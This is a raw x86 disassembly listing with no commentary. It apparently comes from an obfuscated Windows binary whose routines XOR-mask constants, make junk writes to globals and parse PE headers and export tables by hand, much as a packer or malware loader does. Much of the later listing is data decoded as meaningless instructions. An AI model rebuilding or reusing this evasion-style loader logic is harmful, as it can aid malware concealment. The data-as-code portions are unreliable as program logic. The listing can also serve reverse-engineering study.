  423a6e:	mov    edx,DWORD PTR [ebp-0x1c]
  423a71:	mov    ebx,DWORD PTR [ebp-0xc]
  423a74:	xor    edx,esi
  423a76:	add    edx,edi
  423a78:	imul   edx,ebx
  423a7b:	mov    ebx,DWORD PTR [ebp-0x8]
  423a7e:	mov    BYTE PTR [edx+ebx*1],al
  423a81:	mov    eax,DWORD PTR [ebp-0x30]
  423a84:	mov    edx,DWORD PTR [ebp-0x3c]
  423a87:	xor    eax,esi
  423a89:	xor    edx,esi
  423a8b:	add    eax,edi
  423a8d:	add    edx,edi
  423a8f:	imul   eax,edx
  423a92:	add    eax,DWORD PTR [ebp-0xc]
  423a95:	mov    DWORD PTR [ebp-0xc],eax
  423a98:	mov    eax,DWORD PTR [ebp-0xc]
  423a9b:	mov    edx,DWORD PTR [ebp-0x24]
  423a9e:	cmp    edx,eax
  423aa0:	jb     0x41e9a5
  423aa6:	mov    eax,DWORD PTR [ebp-0x3c]
  423aa9:	mov    edx,DWORD PTR [ebp-0x24]
  423aac:	xor    eax,esi
  423aae:	add    eax,edi
  423ab0:	imul   eax,edx
  423ab3:	mov    edx,DWORD PTR [ebp-0x20]
  423ab6:	xor    edx,esi
  423ab8:	add    edx,edi
  423aba:	or     eax,edx
  423abc:	mov    edx,DWORD PTR [ebp-0x18]
  423abf:	xor    edx,esi
  423ac1:	add    eax,edx
  423ac3:	mov    edx,DWORD PTR [ebp-0x18]
  423ac6:	xor    edx,esi
  423ac8:	add    eax,edx
  423aca:	mov    edx,DWORD PTR [ebp-0x10]
  423acd:	lea    eax,[eax+edx*1+0x64e5b6]
  423ad4:	jmp    0x423ae8
  423ad9:	mov    eax,DWORD PTR [ebp-0x18]
  423adc:	mov    edx,DWORD PTR [ebp-0x10]
  423adf:	xor    eax,esi
  423ae1:	lea    eax,[eax+edx*1+0x3272db]
  423ae8:	mov    DWORD PTR [ebp-0x10],eax
  423aeb:	jmp    0x41e8f2
  423af0:	mov    eax,DWORD PTR [ebp-0x38]
  423af3:	mov    edx,DWORD PTR [ebp+0xc]
  423af6:	xor    edx,esi
  423af8:	lea    ecx,[ecx+edx*1+0x3272db]
  423aff:	lea    edx,[ecx-0x3272db]
  423b05:	xor    edx,esi
  423b07:	cmp    edx,0xf89c95b6
  423b0d:	jne    0x41e770
  423b13:	mov    ecx,DWORD PTR [ebp+0x8]
  423b16:	mov    edx,DWORD PTR [ebp+0xc]
  423b19:	mov    ebx,DWORD PTR [ebp+0x8]
  423b1c:	xor    edx,esi
  423b1e:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423b25:	xor    ecx,esi
  423b27:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423b2e:	xor    ebx,esi
  423b30:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423b37:	mov    edx,DWORD PTR [ebp+0xc]
  423b3a:	xor    edx,esi
  423b3c:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423b43:	mov    eax,DWORD PTR [ebp+0xc]
  423b46:	xor    eax,esi
  423b48:	add    eax,edi
  423b4a:	pop    edi
  423b4b:	pop    esi
  423b4c:	pop    ebx
  423b4d:	leave  
  423b4e:	ret    0x8
  423b51:	push   ebp
  423b52:	mov    ebp,esp
  423b54:	push   ecx
  423b55:	mov    eax,ds:0x42c008
  423b5a:	xor    DWORD PTR ds:0x42c000,eax
  423b60:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423b67:	mov    eax,DWORD PTR [ebp+0x8]
  423b6a:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423b74:	mov    al,BYTE PTR [eax]
  423b76:	add    DWORD PTR ds:0x429020,0x42b018
  423b80:	add    al,0xd
  423b82:	xor    DWORD PTR ds:0x42901c,0x429000
  423b8c:	xor    al,0x6f
  423b8e:	mov    DWORD PTR ds:0x42d008,0x56e
  423b98:	cmp    al,0x35
  423b9a:	mov    DWORD PTR ds:0x42c000,0x518
  423ba4:	jne    0x423c1f
  423baa:	mov    eax,DWORD PTR [ebp+0x8]
  423bad:	mov    edx,DWORD PTR ds:0x429014
  423bb3:	or     DWORD PTR ds:0x429010,edx
  423bb9:	mov    ecx,DWORD PTR [ebp+0x8]
  423bbc:	add    ecx,DWORD PTR [eax+0x3c]
  423bbf:	mov    edx,0x7510893
  423bc4:	adc    eax,DWORD PTR ds:0x42c01c
  423bca:	mov    DWORD PTR [ebp+0x8],ecx
  423bcd:	mov    eax,DWORD PTR [ebp-0x4]
  423bd0:	xor    eax,edx
  423bd2:	adc    ecx,0x2aad
  423bd8:	push   esi
  423bd9:	add    DWORD PTR ds:0x42d01c,0x22ba
  423be3:	mov    esi,DWORD PTR [ebp+0x8]
  423be6:	xor    ecx,ecx
  423be8:	xor    ecx,DWORD PTR ds:0x42901c
  423bee:	xor    ecx,DWORD PTR ds:0x42a010
  423bf4:	mov    DWORD PTR ds:0x42901c,ecx
  423bfa:	mov    ecx,0x3272db
  423bff:	add    eax,ecx
  423c01:	cmp    DWORD PTR [esi+0x54],eax
  423c04:	pop    esi
  423c05:	je     0x423c13
  423c0b:	mov    eax,DWORD PTR [ebp+0x8]
  423c0e:	jmp    0x423c2c
  423c13:	mov    eax,DWORD PTR [ebp-0x4]
  423c16:	xor    eax,edx
  423c18:	add    eax,ecx
  423c1a:	jmp    0x423c2c
  423c1f:	mov    eax,DWORD PTR [ebp-0x4]
  423c22:	xor    eax,0x7510893
  423c27:	add    eax,0x3272db
  423c2c:	leave  
  423c2d:	ret    0x4
  423c30:	push   ebp
  423c31:	mov    ebp,esp
  423c33:	push   ecx
  423c34:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423c3e:	push   ecx
  423c3f:	and    DWORD PTR ds:0x42d014,0x0
  423c49:	jmp    0x423c5d
  423c4e:	xor    edx,edx
  423c50:	add    edx,DWORD PTR ds:0x42d014
  423c56:	inc    edx
  423c57:	mov    DWORD PTR ds:0x42d014,edx
  423c5d:	cmp    DWORD PTR ds:0x42d014,0x1d
  423c64:	jae    0x423c9b
  423c6a:	cmp    DWORD PTR ds:0x42d014,0x26
  423c71:	jne    0x423c96
  423c77:	push   0x643f
  423c7c:	push   DWORD PTR [ebp-0x24]
  423c7f:	push   0x42a010
  423c84:	push   DWORD PTR [ebp-0xc]
  423c87:	push   DWORD PTR [ebp-0x10]
  423c8a:	push   DWORD PTR [ebp-0x10]
  423c8d:	push   DWORD PTR [ebp-0x28]
  423c90:	call   DWORD PTR ds:0x42502c
  423c96:	jmp    0x423c4e
  423c9b:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423ca2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423ca9:	dec    eax
  423caa:	mov    eax,DWORD PTR [ebp-0x4]
  423cad:	add    edx,0x6ccb
  423cb3:	push   esi
  423cb4:	mov    esi,DWORD PTR [ebp-0x8]
  423cb7:	adc    DWORD PTR ds:0x42a00c,ebx
  423cbd:	mov    edx,0x7510893
  423cc2:	sbb    DWORD PTR ds:0x42c018,0x5978
  423ccc:	xor    eax,edx
  423cce:	sbb    DWORD PTR ds:0x42901c,0x3646
  423cd8:	xor    esi,edx
  423cda:	sub    DWORD PTR ds:0x429014,0x4430
  423ce4:	mov    ecx,0x3272db
  423ce9:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423cf3:	add    esi,ecx
  423cf5:	mov    DWORD PTR ds:0x42a010,0x31b3
  423cff:	add    eax,ecx
  423d01:	inc    DWORD PTR ds:0x42c01c
  423d07:	imul   eax,esi
  423d0a:	mov    esi,DWORD PTR [ebp+0xc]
  423d0d:	mov    DWORD PTR ds:0x429028,0xd41
  423d17:	cmp    esi,eax
  423d19:	jne    0x423d37
  423d1f:	and    esi,eax
  423d21:	mov    eax,DWORD PTR [ebp-0x4]
  423d24:	mov    esi,DWORD PTR [ebp-0x8]
  423d27:	xor    eax,edx
  423d29:	xor    esi,edx
  423d2b:	add    eax,ecx
  423d2d:	add    esi,ecx
  423d2f:	imul   eax,esi
  423d32:	jmp    0x423d72
  423d37:	mov    eax,DWORD PTR [ebp+0xc]
  423d3a:	mov    eax,DWORD PTR [eax+0x78]
  423d3d:	mov    DWORD PTR [ebp+0xc],eax
  423d40:	mov    eax,DWORD PTR [ebp-0x4]
  423d43:	mov    esi,DWORD PTR [ebp-0x8]
  423d46:	xor    eax,edx
  423d48:	xor    esi,edx
  423d4a:	add    eax,ecx
  423d4c:	add    esi,ecx
  423d4e:	imul   eax,esi
  423d51:	mov    esi,DWORD PTR [ebp+0xc]
  423d54:	cmp    esi,eax
  423d56:	mov    eax,DWORD PTR [ebp-0x4]
  423d59:	je     0x423d24
  423d5f:	xor    eax,edx
  423d61:	add    eax,ecx
  423d63:	mov    ecx,DWORD PTR [ebp+0xc]
  423d66:	imul   eax,ecx
  423d69:	add    eax,DWORD PTR [ebp+0x8]
  423d6c:	mov    DWORD PTR [ebp+0xc],eax
  423d6f:	mov    eax,DWORD PTR [ebp+0xc]
  423d72:	pop    esi
  423d73:	leave  
  423d74:	ret    0x8
  423d77:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423d7d:	inc    edx
  423d7e:	add    BYTE PTR [eax],cl
  423d80:	mov    al,ds:0xa00c0042
  423d85:	inc    edx
  423d86:	add    BYTE PTR [eax],dl
  423d88:	mov    al,ds:0xa0140042
  423d8d:	inc    edx
  423d8e:	add    BYTE PTR [eax],bl
  423d90:	mov    al,ds:0xa01c0042
  423d95:	inc    edx
  423d96:	add    BYTE PTR [eax],al
  423d98:	mov    al,0x42
  423d9a:	add    BYTE PTR [eax+esi*4],al
  423d9d:	inc    edx
  423d9e:	add    BYTE PTR [eax],cl
  423da0:	mov    al,0x42
  423da2:	add    BYTE PTR [eax+esi*4],cl
  423da5:	inc    edx
  423da6:	add    BYTE PTR [eax],dl
  423da8:	mov    al,0x42
  423daa:	add    BYTE PTR [eax+esi*4],dl
  423dad:	inc    edx
  423dae:	add    BYTE PTR [eax],bl
  423db0:	mov    al,0x42
  423db2:	add    BYTE PTR [eax+esi*4],bl
  423db5:	inc    edx
  423db6:	add    BYTE PTR [eax],al
  423db8:	rol    BYTE PTR [edx+0x0],0x4
  423dbc:	rol    BYTE PTR [edx+0x0],0x8
  423dc0:	rol    BYTE PTR [edx+0x0],0xc
  423dc4:	rol    BYTE PTR [edx+0x0],0x10
  423dc8:	rol    BYTE PTR [edx+0x0],0x14
  423dcc:	rol    BYTE PTR [edx+0x0],0x18
  423dd0:	rol    BYTE PTR [edx+0x0],0x1c
  423dd4:	rol    BYTE PTR [edx+0x0],0x75
  423dd8:	ins    DWORD PTR es:[edi],dx
  423dd9:	push   ecx
  423dda:	push   eax
  423ddb:	jo     0x423e57
  423ddd:	addr16 jo 0x423e36
  423de0:	pop    eax
  423de1:	inc    ebp
  423de2:	push   edx
  423de3:	jb     0x423e59
  423de5:	inc    esi
  423de6:	je     0x423e2f
  423de8:	gs ins BYTE PTR es:[edi],dx
  423dea:	dec    esp
  423deb:	js     0x423e55
  423ded:	inc    edx
  423dee:	js     0x423e36
  423df0:	arpl   WORD PTR [edx+0x66],ax
  423df3:	inc    ebx
  423df4:	push   ebp
  423df5:	jno    0x423e6d
  423df7:	xchg   ebx,eax
  423df8:	inc    ecx
  423df9:	inc    edx
  423dfa:	add    BYTE PTR [ebx+0x3f004241],bl
  423e00:	inc    eax
  423e01:	inc    edx
  423e02:	add    bh,ch
  423e04:	or     esi,DWORD PTR [edx+0x304e790e]
  423e0a:	dec    esi
  423e0b:	xchg   DWORD PTR [edi+0x3d],ecx
  423e0e:	dec    esi
  423e0f:	scas   eax,DWORD PTR es:[edi]
  423e10:	dec    edi
  423e11:	ds dec esi
  423e13:	js     0x423e63
  423e15:	cmp    ecx,DWORD PTR [esi-0x64]
  423e18:	dec    edi
  423e19:	inc    esp
  423e1a:	dec    esi
  423e1b:	jae    0x423e6b
  423e1d:	inc    ecx
  423e1e:	dec    esi
  423e1f:	xor    BYTE PTR [esi+0x40],cl
  423e22:	dec    esi
  423e23:	pop    esp
  423e24:	pop    ebp
  423e25:	pop    edi
  423e26:	push   edx
  423e27:	cmp    DWORD PTR [esi+0x79],ecx
  423e2a:	dec    esi
  423e2b:	xor    BYTE PTR [esi-0x79],cl
  423e2e:	dec    edi
  423e2f:	cmp    eax,0x3e4faf4e
  423e34:	dec    esi
  423e35:	js     0x423e85
  423e37:	cmp    ecx,DWORD PTR [esi-0x64]
  423e3a:	dec    edi
  423e3b:	inc    esp
  423e3c:	dec    esi
  423e3d:	mov    DWORD PTR [edi+0x41],ecx
  423e40:	dec    esi
  423e41:	xor    BYTE PTR [esi+0x40],cl
  423e44:	dec    esi
  423e45:	pop    esp
  423e46:	ins    DWORD PTR es:[edi],dx
  423e47:	pop    edi
  423e48:	bound  edi,QWORD PTR [ecx]
  423e4a:	dec    esi
  423e4b:	jns    0x423e9b
  423e4d:	xor    BYTE PTR [esi-0x80],cl
  423e50:	dec    edi
  423e51:	cmp    eax,0x394e734e
  423e56:	dec    esi
  423e57:	mov    ds:0x304e3a4f,al
  423e5c:	dec    esi
  423e5d:	inc    esi
  423e5e:	dec    esi
  423e5f:	pop    esp
  423e60:	jge    0x423ec1
  423e62:	jb     0x423ed3
  423e64:	sub    BYTE PTR [esi-0x7d],0x7e
  423e68:	xchg   ebx,eax
  423e69:	jns    0x423dfb
  423e6b:	aas    
  423e6c:	dec    esi
  423e6d:	test   BYTE PTR [edi+0x30],cl
  423e70:	dec    esi
  423e71:	test   BYTE PTR [edi+0x3c],cl
  423e74:	dec    esi
  423e75:	mov    ds:0x734e394f,al
  423e7a:	dec    esi
  423e7b:	inc    ebp
  423e7c:	dec    esi
  423e7d:	xor    BYTE PTR [esi+0x44],cl
  423e80:	dec    esi
  423e81:	pop    esp
  423e82:	lea    ebx,[edi-0x7e]
  423e85:	outs   dx,DWORD PTR ds:[esi]
  423e86:	xchg   edx,eax
  423e87:	outs   dx,BYTE PTR ds:[esi]
  423e88:	xchg   ebx,eax
  423e89:	jle    0x423e2e
  423e8b:	jns    0x423e2d
  423e8d:	aas    
  423e8e:	dec    esi
  423e8f:	test   BYTE PTR [edi+0x30],cl
  423e92:	dec    esi
  423e93:	test   BYTE PTR [edi+0x3c],cl
  423e96:	dec    esi
  423e97:	mov    ds:0x894e394f,al
  423e9c:	dec    edi
  423e9d:	inc    ebp
  423e9e:	dec    esi
  423e9f:	xor    BYTE PTR [esi+0x44],cl
  423ea2:	dec    esi
  423ea3:	pop    esp
  423ea4:	popf   
  423ea5:	pop    edi
  423ea6:	xchg   edx,eax
  423ea7:	outs   dx,DWORD PTR ds:[esi]
  423ea8:	mov    ds:0xb37ea36e,al
  423ead:	jns    0x423e5f
  423eaf:	aas    
  423eb0:	dec    esi
  423eb1:	mov    cs,WORD PTR [edi+0x30]
  423eb4:	dec    esi
  423eb5:	lods   al,BYTE PTR ds:[esi]
  423eb6:	dec    edi
  423eb7:	cmp    eax,0x394e734e
  423ebc:	dec    esi
  423ebd:	mov    eax,ds:0x304e3a4f
  423ec2:	dec    esi
  423ec3:	inc    esp
  423ec4:	dec    esi
  423ec5:	pop    esp
  423ec6:	lods   eax,DWORD PTR ds:[esi]
  423ec7:	pop    edi
  423ec8:	mov    ds:0xb36eb26f,al
  423ecd:	jle    0x423e92
  423ecf:	jns    0x423e91
  423ed1:	aas    
  423ed2:	dec    esi
  423ed3:	mov    cs,WORD PTR [edi+0x30]
  423ed6:	dec    esi
  423ed7:	lods   al,BYTE PTR ds:[esi]
  423ed8:	dec    edi
  423ed9:	cmp    eax,0x394e7e4e
  423ede:	dec    esi
  423edf:	lahf   
  423ee0:	dec    edi
  423ee1:	cmp    ecx,DWORD PTR [esi+0x30]
  423ee4:	dec    esi
  423ee5:	inc    ebp
  423ee6:	dec    esi
  423ee7:	pop    esp
  423ee8:	mov    ebp,0xc26fb25f
  423eed:	outs   dx,BYTE PTR ds:[esi]
  423eee:	ret    
  423eef:	jle    0x423ec4
  423ef1:	jns    0x423ec3
  423ef3:	aas    
  423ef4:	dec    esi
  423ef5:	mov    cs,WORD PTR [edi+0x30]
  423ef8:	dec    esi
  423ef9:	lods   al,BYTE PTR ds:[esi]
  423efa:	dec    edi
  423efb:	cmp    eax,0x394f804e
  423f00:	dec    esi
  423f01:	lods   al,BYTE PTR ds:[esi]
  423f02:	dec    edi
  423f03:	cmp    cl,BYTE PTR [esi+0x30]
  423f06:	dec    esi
  423f07:	inc    esi
  423f08:	dec    esi
  423f09:	pop    esp
  423f0a:	int    0x5f
  423f0c:	ret    0xd26f
  423f0f:	outs   dx,BYTE PTR ds:[esi]
  423f10:	sar    DWORD PTR [esi-0x1d],cl
  423f13:	jns    0x423ef5
  423f15:	aas    
  423f16:	dec    esi
  423f17:	mov    cs,WORD PTR [edi+0x30]
  423f1a:	dec    esi
  423f1b:	lods   al,BYTE PTR ds:[esi]
  423f1c:	dec    edi
  423f1d:	cmp    eax,0x394f834e
  423f22:	dec    esi
  423f23:	mov    ds:0x304e3a4f,al
  423f28:	dec    esi
  423f29:	inc    esp
  423f2a:	dec    esi
  423f2b:	pop    esp
  423f2c:	fstp   QWORD PTR [edi-0x2e]
  423f2f:	outs   dx,DWORD PTR ds:[esi]
  423f30:	loop   0x423fa0
  423f32:	jecxz  0x423fb2
  423f34:	repz jns 0x423f27
  423f37:	aas    
  423f38:	dec    esi
  423f39:	lea    ecx,[edi+0x30]
  423f3c:	dec    esi
  423f3d:	lahf   
  423f3e:	dec    edi
  423f3f:	cmp    eax,0x3c4fa04e
  423f44:	dec    esi
  423f45:	xor    BYTE PTR [esi+0x3f],cl
  423f48:	dec    esi
  423f49:	pop    esp
  423f4a:	in     eax,dx
  423f4b:	pop    edi
  423f4c:	loop   0x423fbd
  423f4e:	repnz outs dx,BYTE PTR ds:[esi]
  423f50:	repz jle 0x423f56
  423f53:	jns    0x423f55
  423f55:	jle    0x423f6a
  423f57:	jns    0x423f69
  423f59:	cmp    al,0x4e
  423f5b:	jg     0x423fab
  423f5d:	xor    BYTE PTR [esi-0x65],cl
  423f60:	dec    edi
  423f61:	xor    cl,BYTE PTR [esi-0x80]
  423f64:	dec    edi
  423f65:	cmp    al,0x4e
  423f67:	lods   eax,DWORD PTR ds:[esi]
  423f68:	dec    edi
  423f69:	cmp    ecx,DWORD PTR [esi+0x30]
  423f6c:	dec    esi
  423f6d:	inc    ebp
  423f6e:	dec    esi
  423f6f:	pop    esp
  423f70:	or     eax,0x126f025f
  423f75:	outs   dx,BYTE PTR ds:[esi]
  423f76:	adc    edi,DWORD PTR [esi+0x23]
  423f79:	jns    0x423f9b
  423f7b:	aas    
  423f7c:	dec    esi
  423f7d:	add    BYTE PTR [eax],al
  423f7f:	pop    es
  423f80:	ds inc edx
  423f82:	add    bl,bh
  423f84:	aas    
  423f85:	inc    edx
  423f86:	add    BYTE PTR [ebx],al
  423f88:	inc    eax
  423f89:	inc    edx
  423f8a:	add    BYTE PTR [edi+0x7004241],bl
  423f90:	inc    ecx
  423f91:	inc    edx
  423f92:	add    BYTE PTR [edi-0x1cffbdbf],cl
  423f98:	aas    
  423f99:	inc    edx
  423f9a:	add    bh,ah
  423f9c:	aas    
  423f9d:	inc    edx
  423f9e:	add    BYTE PTR [ebx+0x4b004241],cl
  423fa4:	inc    eax
  423fa5:	inc    edx
  423fa6:	add    BYTE PTR ds:0x36f89ca9,cl
  423fac:	mov    edx,0x3ffff89c
  423fb1:	inc    edx
  423fb2:	add    bl,al
  423fb4:	inc    eax
  423fb5:	inc    edx
  423fb6:	add    bh,dl
  423fb8:	inc    eax
  423fb9:	inc    edx
  423fba:	add    bl,ah
  423fbc:	inc    eax
  423fbd:	inc    edx
  423fbe:	add    bl,dh
  423fc0:	inc    eax
  423fc1:	inc    edx
  423fc2:	add    BYTE PTR [edi],dh
  423fc4:	inc    eax
  423fc5:	inc    edx
  423fc6:	add    BYTE PTR [ebx],al
  423fc8:	ds inc edx
  423fca:	add    BYTE PTR [edi+0x40],dl
  423fcd:	inc    edx
  423fce:	add    BYTE PTR [edi+0x40],al
  423fd1:	inc    edx
  423fd2:	add    BYTE PTR [ebx-0x49ffbdbf],ah
  423fd8:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  423fdf:	or     eax,DWORD PTR [eax+0x42]
  423fe2:	add    BYTE PTR [esp+ebx*1],dl
  423fe5:	push   ss
  423fe6:	or     DWORD PTR [eax],0x7050d
  423fec:	add    BYTE PTR [eax+0x0],al
  423fef:	cmp    al,BYTE PTR [edx+0x3e]
  423ff2:	ds mov edx,0x6d004287
  423ff8:	push   ebp
  423ff9:	inc    esp
  423ffa:	imul   ecx,DWORD PTR [eax],0x86275fa
  424000:	in     eax,dx
  424001:	inc    BYTE PTR [edi]
  424003:	aas    
  424004:	cli    
  424005:	mov    ds:0x423ff305,eax
  42400a:	add    BYTE PTR [ebp-0x4a07636b],dh
  424010:	xchg   esi,eax
  424011:	pushf  
  424012:	clc    
  424013:	mov    ah,0x95
  424015:	pushf  
  424016:	clc    
  424017:	mov    ebx,0xbaf89c95
  42401c:	xchg   ebp,eax
  42401d:	pushf  
  42401e:	clc    
  42401f:	mov    ecx,0xb8f89c95
  424024:	xchg   ebp,eax
  424025:	pushf  
  424026:	clc    
  424027:	mov    edi,0xbef89c95
  42402c:	xchg   ebp,eax
  42402d:	pushf  
  42402e:	clc    
  42402f:	mov    ebp,0xa6f89c95
  424034:	xchg   ebp,eax
  424035:	pushf  
  424036:	clc    
  424037:	jmp    0x423d:0xfb6003f9
  42403e:	add    BYTE PTR [eax+edx*2+0x42],bh
  424042:	add    BYTE PTR [ebx+0x77],dl
  424045:	jbe    0x424097
  424047:	mov    dh,0x85
  424049:	pushf  
  42404a:	clc    
  42404b:	sbb    ecx,ebp
  42404d:	push   eax
  42404e:	pop    es
  42404f:	in     eax,0x7
  424051:	add    BYTE PTR [eax],al
  424053:	idiv   DWORD PTR ds:0xb1b0042
  424059:	add    al,0xe
	...
  42408b:	jl     0x4240dd
  42408d:	inc    edx
  42408e:	add    BYTE PTR [esi+0x68f89c85],dh
  424094:	jne    0x42410f
  424096:	je     0x42410d
  424098:	jns    0x42410e
  42409a:	jb     0x424104
  42409c:	addr16 pushw 0x68
  4240a0:	imul   esp,DWORD PTR [bx+0x68],0x0
  4240a5:	add    BYTE PTR [eax],al
  4240a7:	addr16 pushw 0x68
  4240ab:	addr16 push 0x67
  4240ae:	pushw  0x6b6a
  4240b2:	push   0x676b67
	...
  4240bf:	jle    0x424047
  4240c1:	inc    eax
  4240c2:	add    BYTE PTR [ebp-0x5db060b1],ah
  4240c8:	dec    edi
  4240c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240ca:	dec    edi
  4240cb:	lahf   
  4240cc:	dec    edi
  4240cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240ce:	dec    edi
  4240cf:	ins    DWORD PTR es:[edi],dx
  4240d0:	dec    esi
  4240d1:	bound  ecx,QWORD PTR [esi+0x30]
  4240d4:	dec    esi
  4240d5:	add    BYTE PTR [eax],al
  4240d7:	cdq    
  4240d8:	dec    edi
  4240d9:	pushf  
  4240da:	dec    edi
  4240db:	fwait
  4240dc:	dec    edi
  4240dd:	ins    DWORD PTR es:[edi],dx
  4240de:	dec    esi
  4240df:	bound  ecx,QWORD PTR [esi+0x30]
  4240e2:	dec    esi
  4240e3:	scas   eax,DWORD PTR es:[edi]
  4240e4:	dec    edi
  4240e5:	lods   eax,DWORD PTR ds:[esi]
  4240e6:	dec    edi
  4240e7:	lahf   
  4240e8:	dec    edi
  4240e9:	mov    ds:0x624e6d4f,al
  4240ee:	dec    esi
  4240ef:	xor    BYTE PTR [esi+0x0],cl
  4240f2:	add    BYTE PTR [ebp-0x5bb067b1],ch
  4240f8:	dec    edi
  4240f9:	test   eax,0xa04f934f
  4240fe:	dec    edi
  4240ff:	fwait
  424100:	dec    edi
  424101:	xor    BYTE PTR [esi+0x0],cl
  424104:	add    BYTE PTR [eax],al
  424106:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  42410d:	mov    WORD PTR [ebp-0x32734274],gs
  424113:	mov    ebp,ds
  424115:	mov    ebp,gs
  424117:	mov    ebp,?
  424119:	mov    WORD PTR ds:0x2d8c1d8c,cs
  42411f:	mov    WORD PTR ds:0x6d8c5d8c,?
  424125:	mov    WORD PTR [edx-0x74],?
  424128:	jae    0x4240b6
  42412a:	jo     0x4240b8
  42412c:	jno    0x4240ba
  42412e:	jbe    0x4240bc
  424130:	ja     0x4240be
  424132:	je     0x4240c0
  424134:	jne    0x4240c2
  424136:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  42413d:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  424143:	lods   al,BYTE PTR ds:[esi]
  424144:	jge    0x424102
  424146:	jge    0x4240e6
  424148:	(bad)  
  424149:	jns    0x4241be
  42414b:	mov    ecx,0x7d738cb1
  424150:	ins    DWORD PTR es:[edi],dx
  424151:	enter  0x9fc6,0x26
  424155:	jb     0x42415a
  424157:	test   eax,0xb956bb17
  42415c:	hlt    
  42415d:	test   al,0x37
  42415f:	test   al,0x7e
  424161:	fnstenv [ecx-0x6a]
  424164:	mov    cl,0x6a
  424166:	push   0xffffffce
  424168:	or     BYTE PTR [edx],bl
  42416a:	xlat   BYTE PTR ds:[ebx]
  42416b:	out    dx,eax
  42416c:	add    eax,0x9321d7aa
  424171:	scas   al,BYTE PTR es:[edi]
  424172:	adc    DWORD PTR [esi],esp
  424174:	jge    0x424199
  424176:	fidiv  WORD PTR [edi]
  424178:	leave  
  424179:	hlt    
  42417a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42417b:	cmp    ax,0x1fc8
  42417f:	mov    dh,cl
  424181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424182:	(bad)  
  424183:	and    DWORD PTR [eax],ebx
  424185:	and    DWORD PTR [ecx+0x0],esi
  424188:	add    BYTE PTR [eax],al
  42418a:	add    al,ch
  42418c:	(bad)  [ebx+0x7]
  42418f:	cmc    
  424190:	enter  0x301a,0x10
  424194:	push   eax
  424195:	inc    edx
  424196:	add    BYTE PTR [ecx+0x66],dh
  424199:	jp     0x424209
  42419b:	jmp    0x4241dc
  42419d:	inc    edx
  42419e:	add    BYTE PTR [edi+0x40],cl
  4241a1:	inc    edx
  4241a2:	add    BYTE PTR [eax],cl
  4241a4:	in     eax,dx
  4241a5:	adc    al,BYTE PTR [edi]
  4241a7:	pop    ecx
  4241a8:	inc    ebx
  4241a9:	inc    edx
  4241aa:	outs   dx,BYTE PTR ds:[esi]
  4241ab:	popa   
  4241ac:	imul   eax,DWORD PTR [edx+0x61],0x6b
  4241b0:	jne    0x424220
  4241b2:	dec    ebx
  4241b3:	je     0x424218
  4241b5:	bound  esp,QWORD PTR [edi+0x78]
  4241b8:	dec    eax
  4241b9:	bound  edx,QWORD PTR [ebx+0x53]
  4241bc:	inc    ebx
  4241bd:	push   ebp
  4241be:	push   eax
  4241bf:	ja     0x42423b
  4241c1:	jp     0x424210
  4241c3:	push   esi
  4241c4:	arpl   WORD PTR gs:[ecx+0x45],si
  4241c8:	dec    edx
  4241c9:	dec    esi
  4241ca:	data16 ja 0x42421b
  4241cd:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  4241e0:	add    BYTE PTR [eax],al
  4241e2:	add    BYTE PTR [edi+0x6c],ch
  4241e5:	push   0x49657557
  4241ea:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  4241f0:	push   edi
  4241f1:	je     0x424268
  4241f3:	push   0x66
  4241f5:	jbe    0x424239
  4241f7:	jo     0x424242
  4241f9:	dec    ebp
  4241fa:	dec    ebp
  4241fb:	pop    edx
  4241fc:	jp     0x424258
  4241fe:	jbe    0x424246
  424200:	pop    ecx
  424201:	jo     0x42427b
  424203:	push   edi
  424204:	jbe    0x42424d
  424206:	ja     0x42424b
  424208:	js     0x424252
  42420a:	jno    0x424254
  42420c:	inc    ebp
  42420d:	inc    esp
  42420e:	inc    esp
  42420f:	push   ecx
  424210:	dec    edx
  424211:	ins    BYTE PTR es:[edi],dx
  424212:	dec    ebx
  424213:	jbe    0x424283
  424215:	pop    eax
  424216:	jbe    0x424218
  424218:	add    BYTE PTR [ecx+0x46],al
  42421b:	jae    0x424293
  42421d:	dec    ebx
  42421e:	gs js  0x424287
  424221:	ins    BYTE PTR es:[edi],dx
  424222:	jp     0x424224
  424224:	add    BYTE PTR [ebx+0x41],cl
  424227:	fs gs jno 0x424298
  42422b:	push   ebx
  42422c:	inc    ecx
  42422d:	inc    ebx
  42422e:	outs   dx,BYTE PTR ds:[esi]
  42422f:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  424233:	push   edx
  424234:	push   ecx
  424235:	push   0x43000064
  42423a:	pop    eax
  42423b:	outs   dx,DWORD PTR ds:[esi]
  42423c:	push   0x66694355
  424241:	dec    edi
  424242:	je     0x424290
  424244:	jo     0x424246
  424246:	add    BYTE PTR [ebx+0x6f],dl
  424249:	inc    edi
  42424a:	dec    esi
  42424b:	outs   dx,DWORD PTR ds:[esi]
  42424c:	pop    ecx
  42424d:	inc    edi
  42424e:	jb     0x424297
  424250:	jns    0x4242c8
  424252:	inc    ecx
  424253:	pop    eax
  424254:	add    BYTE PTR [edi+0x67],dh
  424257:	dec    edi
  424258:	dec    esp
  424259:	dec    ebp
  42425a:	inc    edx
  42425b:	jno    0x4242ce
  42425d:	jae    0x4242b2
  42425f:	push   eax
  424260:	arpl   WORD PTR [eax],ax
  424262:	add    BYTE PTR [ecx+edi*2+0x45],cl
  424266:	bound  ebp,QWORD PTR [ecx+0x46]
  424269:	dec    ecx
